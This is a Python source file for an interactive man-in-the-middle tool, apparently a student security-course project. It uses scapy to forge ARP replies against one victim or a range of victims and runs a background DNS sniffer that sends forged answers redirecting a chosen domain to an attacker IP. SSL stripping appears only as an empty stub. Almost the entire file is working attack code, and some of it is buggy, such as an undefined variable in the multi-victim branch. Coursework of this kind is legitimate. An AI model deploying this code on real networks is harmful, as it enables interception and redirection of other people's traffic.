import sys, os, argparse
from util import bcolors, clear, parse_ip_input, validate_domain
from scapy.all import sendp, Ether, ARP, getmacbyip, sniff
from ns import nbns_callback, dns_callback
# from netfilterqueue import NetfilterQueue

from threading import Thread
from time import sleep

# The name of the network interface to use for sniffing and sending packets
INTERFACE_NAME = "enp0s3"
ATTACKS = {
    'a': 'ARP poisoning',
    'b': 'DNS spoofing',
    'c': 'SSL stripping'
}

IP_ATTACKER = ''
MAC_ATTACKER = ''
IP_VICTIMS = []
MAC_VICTIMS = []


# Python 2.7... :(
try:
    input = raw_input
except NameError:
    pass


# Set up argument parser for using arguments in the command line
parser = argparse.ArgumentParser(
    prog='2IC80 tool',
    description='A tool for ARP poising, DNS spoofing and SSL stripping.',
    epilog='There are no arguments, please use the menu provided when running the tool. Good luck!'
)


def ARPposioning():
    IP_ATTACKER = input("Enter IP address of attacker: ")
    MAC_ATTACKER = getmacbyip(IP_ATTACKER)

    victimNumber = input('Do you want to spoof one or multiple victims? (1/m)')
    if victimNumber == "1":
        ipVictim= input("Enter IP address of victim: ")
        macVictim= getmacbyip(ipVictim)

        IP_VICTIMS.append(ipVictim)
        MAC_VICTIMS.append(macVictim)

        ipToSpoof= input("Enter IP address to spoof: ")
        print(ipVictim)
        arp=Ether() / ARP()
        arp[Ether].src= MAC_ATTACKER
        arp[ARP].hwsrc= MAC_ATTACKER
        arp[ARP].psrc= ipToSpoof
        arp[ARP].hwdst= macVictim
        arp[ARP].pdst= ipVictim
        print("\n\n")
    
    elif victimNumber == "m":   
        IPrange=input('What is the range of IP addresses?')
        IpToSpoof=input('What is the IP address to spoof?')
        if "-" in IPrange:
            upperBoundary=IPrange.split("-")[1]
            lowerBoundary=lowerBoundary=IPrange.split(".")[3].split("-")[0]

            for i in range(int(lowerBoundary), int(upperBoundary)):
                 
                ipVictim= IPrange.split(".")[0]+"."+IPrange.split(".")[1]+"."+IPrange.split(".")[2]+"."+str(i)
                macVictim= getmacbyip(ipVictim)

                IP_VICTIMS.append(ipVictim)
                MAC_VICTIMS.append(macVictim)

                print(ipVictim)
                arp=Ether() / ARP()
                arp[Ether].src= MAC_ATTACKER
                arp[ARP].hwsrc= MAC_ATTACKER
                arp[ARP].psrc= ipToSpoof
                arp[ARP].hwdst= macVictim
                arp[ARP].pdst= ipVictim
        else:
            print("Invalid input. Please try again.")

        print("\n\n")
    

    sendp(arp, iface=INTERFACE_NAME)
    print('{cyan}{attack}{endc} has been executed (packet has been succesfully sent)\n'.format(cyan=bcolors.OKCYAN, attack=ATTACKS["a"], endc=bcolors.ENDC))
    

def DNSpoisoning():
    dns_ip = ''
    dns_domain = ''

    # Ask for a domain until a valid one is provided
    while not dns_domain:
        dns_domain_input = input('Enter the domain name to spoof: ')
        dns_domain_valid = validate_domain(dns_domain_input)

        if dns_domain_valid:
            dns_domain = dns_domain_input
        else:
            print('{warning}Please enter a valid domain (format: www.example.com){endc}'.format(warning=bcolors.WARNING, endc=bcolors.ENDC))


    # Ask for an IP address until a valid one is provided
    while not dns_ip:
        dns_ip_input = input('Enter the IP address to redirect the spoofed domain name to: ')
        dns_ip_parsed = parse_ip_input(dns_ip_input)

        if len(dns_ip_parsed) == 1:
            dns_ip = dns_ip_parsed[0]
        else:
            print('{warning}Please fill in a single valid IP address, not a range or list.{endc}'.format(warning=bcolors.WARNING, endc=bcolors.ENDC))
    
    # Start a new thread which is sniffing for DNS packets and calls the callback function when a packet is received
    # NOTE: Python 2.7-safe, so no daemon constructor arg but set later
    dns_sniffing_thread = Thread(target=dns_sniffing, args=(dns_domain, dns_ip), name='DNSSniffing')
    dns_sniffing_thread.daemon = True
    dns_sniffing_thread.start()

    print('\n{cyan}{attack}{endc} has been executed (set up a background task which will return a packet to victim resolving {cyan}{domain}{endc} to {cyan}{ip}{endc} whenever the victim sends the DNS query)\n'.format(cyan=bcolors.OKCYAN, attack=ATTACKS['b'], endc=bcolors.ENDC, domain=dns_domain, ip=dns_ip))

def dns_sniffing(dns_domain, dns_ip):
    print('Sniffing for DNS packets...\n')
    sniff(filter='udp and port 53', prn=lambda packet: dns_callback(packet, dns_domain, dns_ip), iface='enp0s8')
    print('Sniff finished!')


def SSLstripping():
    print('SSL stripping selected.\n')


def main():
    clear()
    print('2IC80: Tool by G44')

    # Setup IP forwarding to allow for DNS spoofing & SSL stripping
    # setup_ip_forwarding()

    # Main program loop
    while True:
        print('Select the preferred attack from the list below:\n')
        
        print('    {cyan}a{endc}) {attack}'.format(cyan=bcolors.OKCYAN, attack=ATTACKS['a'], endc=bcolors.ENDC))
        print('    {cyan}b{endc}) {attack}'.format(cyan=bcolors.OKCYAN, attack=ATTACKS['b'], endc=bcolors.ENDC))
        print('    {cyan}c{endc}) {attack}'.format(cyan=bcolors.OKCYAN, attack=ATTACKS['c'], endc=bcolors.ENDC))
        print('    {cyan}d{endc}) Exit\n'.format(cyan=bcolors.OKCYAN, endc=bcolors.ENDC))

        choice = input('\nYour choice: ' + bcolors.OKCYAN)
        print(bcolors.ENDC + '\n')
        selectedName = choice
        if choice in ATTACKS:
            selectedName = ATTACKS[choice]
        elif choice == 'd':
            selectedName = 'Exit'
        print('You have selected {cyan}{name}{endc}. \n'.format(cyan=bcolors.OKCYAN, name=selectedName, endc=bcolors.ENDC))

        if choice == 'd':
            break
        elif choice == 'a':
            ARPposioning()
        elif choice == 'b':
            DNSpoisoning()
        elif choice == 'c':
            SSLstripping()
        else:
            print('Invalid input. Please try again.\n')


# Entry point: This part runs when the tool is called from the command line using `python tool.py`. The if-statement is not required, but good practice.
if __name__ == '__main__':
    parser.parse_args()
    main()
